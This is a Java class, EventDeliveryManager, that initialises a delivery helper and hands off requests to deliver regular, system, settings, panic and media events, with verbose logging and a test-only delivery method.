package com.vvt.eventdelivery;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxCallerID;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.logger.FxLog;

public class EventDeliveryManager implements EventDelivery {
	private static final String TAG = "EventDeliveryManager";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private EventDeliveryHelper mEventDeliveryHelper;
	private DataDelivery mDataDelivery;
	private FxEventRepository mEventRepository;
	private AppContext mAppContext;
	
	public void setAppContext(AppContext appContext) {
		mAppContext = appContext;
	}
	
	public void setDataDelivery(DataDelivery dataDelivery) {
		mDataDelivery = dataDelivery;
	}
	
	public void setEventRepository(FxEventRepository eventRepository) {
		mEventRepository = eventRepository;
	}
	
	public void initialize() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "# initialize START");
		
		if(mDataDelivery == null) {
			throw new FxNullNotAllowedException("DataDelivery can not be null.");
		}
		
		if(mEventRepository == null) {
			throw new FxNullNotAllowedException("EventRepository can not be null.");
		}
		
		if(mAppContext == null) {
			throw new FxNullNotAllowedException("AppContext can not be null.");
		}
		
		InitializeParameters initializeParameters = new InitializeParameters();
		initializeParameters.setCallerId(FxCallerID.EVENT_DELIVERY_ID);
		initializeParameters.setDataDelivery(mDataDelivery);
		initializeParameters.setEventRepository(mEventRepository);
		
		String writtablePath = mAppContext.getWritablePath();
		
		mEventDeliveryHelper = new EventDeliveryHelper(initializeParameters, writtablePath);

		if(LOGV) FxLog.v(TAG, "# initialize EXIT");
	}
	
	/**
	 * Regular event is the set of events, excluding Panic, Alert, System, and Actual Media.
	 * Regular events divides into 2 group e.g. events and thumbnail events (media events).
	 * Normally, normal events get delivered first.
	 */
	@Override
	public void deliverRegularEvents() {
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_REGULAR, EventDeliveryHelper.NO_PARING_ID);
	}

	@Override
	public void deliverSystemEvents() {
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_SYSTEM, EventDeliveryHelper.NO_PARING_ID);
	}
	
	@Override
	public void deliverSettingsEvents() {
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_SETTINGS, EventDeliveryHelper.NO_PARING_ID);
	}

	/**
	 * Supporting both Panic and Alert.
	 */
	@Override
	public void deliverPanicEvents() {
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_PANIC, EventDeliveryHelper.NO_PARING_ID);
	}
	
	/**
	 * DON"T CALL THIS METHOD! , this method is for test Panic, setting, system and alert event.
	 * @param listener
	 */
	public void forTest_deliverEvents(EventDelivery.Type type, DeliveryListener listener) {
		mEventDeliveryHelper.handleRequest(type, EventDeliveryHelper.NO_PARING_ID,listener);
		
	}
	

	@Override
	public void deliverActualMedia(int paringId, DeliveryListener listener) throws FxDbIdNotFoundException {
		if(LOGV) FxLog.v(TAG, "# deliverActualMedia START");
		
		if(paringId < 0) {
			throw new FxDbIdNotFoundException(
					String.format(FxDbIdNotFoundException.UPLOAD_ACTUAL_MEDIA_PAIRING_ID_NOT_FOUND,paringId));
		}
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_ACTUAL_MEDIA, paringId, listener);
		
		if(LOGV) FxLog.v(TAG, "# deliverActualMedia EXIT");
	}

	@Override
	public void deliverRegularEvents(DeliveryListener listener) {
		if(LOGV) FxLog.v(TAG, "# deliverRegularEvents START");
		
		mEventDeliveryHelper.handleRequest(
				EventDelivery.Type.TYPE_REGULAR, 
				EventDeliveryHelper.NO_PARING_ID, listener);
		
		if(LOGV) FxLog.v(TAG, "# deliverRegularEvents EXIT");
	}

	public DeliveryListener getDeliveryListener() {
		return mEventDeliveryHelper;
	}

}
